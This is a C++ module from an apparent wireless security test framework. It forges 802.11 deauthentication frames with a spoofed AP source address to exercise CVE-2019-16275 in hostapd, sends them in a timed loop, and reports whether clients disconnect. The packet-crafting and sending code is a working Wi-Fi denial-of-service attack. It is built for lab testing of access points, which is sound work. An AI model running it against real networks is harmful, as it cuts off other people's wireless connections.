#include <chrono>
#include <thread>
#include <nlohmann/json.hpp>
#include <tins/tins.h>

#include "attacks/DoS_soft/deauth/deauth.h"
#include "attacks/components/setup_connections.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "interrupt.h"
#include "logger/log_util.h"
#include "logger/report.h"
#include "observer/tshark_wrapper.h"
#include "visual/result_helper.h"

namespace wpa3_tester::deauth_attack {
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

// CVE-2019-16275 / hostapd advisory 2019-7 //TODO test on version < 3 linux distros //FIXME not tested yet
// Deauth FROM AP TO client
// client with PMF receives it as NL80211_CMD_UNPROT_DEAUTHENTICATE sme_event_unprot_disconnect checks SA==BSSID + reason==CLASS3 → triggers SA Query.
// Unpatched AP (hostapd < 2.10) does not validate SA of received frames, so an attacker can spoof SA=AP_MAC
// The AP will process or forward in a way that breaks the SA Query exchange
// patched hostapd (>= 2.10) silently drops frames where SA == own_addr before processing.
static RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
    Dot11Deauthentication frame;
    frame.addr1(sta_mac); // DA = client
    frame.addr2(ap_mac);  // SA = AP (forged) — triggers 2019-7 on unpatched AP
    frame.addr3(ap_mac);  // BSSID
    frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA — required by sme_event_unprot_disconnect

    RadioTap rt;
    rt.inner_pdu(frame);
    return rt;
}

void setup_attack(RunStatus &rs) {
    // WPA2-PSK does not emit EAPOL-4WAY-HS-COMPLETED; use AP-STA-CONNECTED instead
    components::client_ap_setup(rs, false);
}

void run_attack(RunStatus &rs) {
    const auto &att_cfg = rs.config().at("attack_config");
    rs.start_observers();

    const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
    const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
    const string iface = rs.get_actor("attacker").get(SK::iface);

    interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
    if (g_interrupted.load()) return;

    log(LogLevel::INFO, "Deauth attack START");
    PacketSender sender{iface};
    RadioTap pkt = make_deauth(ap_mac, sta_mac);
    const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
    while (steady_clock::now() < end && !g_interrupted.load()) {
        sender.send(pkt);
        this_thread::sleep_for(milliseconds(att_cfg.at("ms_interval")));
    }
    log(LogLevel::INFO, "Deauth attack END");

    interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
    rs.process_manager.stop_all();
}

void stats_attack(const RunStatus &rs) {
    vector<unique_ptr<GraphElements>> elements;
    rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});

    const path sta_graph = observer::tshark::tshark_graph(rs, "client", elements);
    const path ap_graph  = observer::tshark::tshark_graph(rs, "ap", elements);

    // report
    {
        report::ReportGuard report(rs.run_folder());
        if (report) {
            report << "# Deauth DoS Attack (WPA2)\n\n";
            report::attack_mapping_table(report, rs);
            if (!sta_graph.empty()) {
                report << "### STA (wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
                report << "![STA Graph](" << sta_graph << ")\n\n";
            }
            if (!ap_graph.empty()) {
                report << "### AP (hostapd " << hostapd::get_version(rs, "ap") << ")\n";
                report << "![AP Graph](" << ap_graph << ")\n\n";
            }
            report << "---\n";
        }
    }

    nlohmann::json result;
    const auto window = visual::helper::get_run_window(rs);
    result["client_disconnected"] = visual::helper::get_client_disconnected(rs, window);
    // AP-STA-DISCONNECTED fires if AP properly deauths client; INTERFACE-DISABLED fires if
    // the deauth SA==own_addr bug causes nl80211 to bring the AP interface down entirely
    result["ap_disconnected"] = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", window).empty();
    result["client_mfp"]          = visual::helper::get_client_mfp(rs, window);
    result["ap_WPA_support"]      = visual::helper::get_ap_WPA_support(rs);
    result["client_WPA_support"]  = visual::helper::get_client_WPA_support(rs, window);

    const path combined = rs.run_folder() / "logger" / "combined.log";
    const TimeWindow w_start{LogTimePoint{}, get_tag_time(combined, START_tag)};
    result["conn_WPA_version"] = visual::helper::get_conn_WPA_version(rs, w_start);

    rs.save_result(result);
}

}
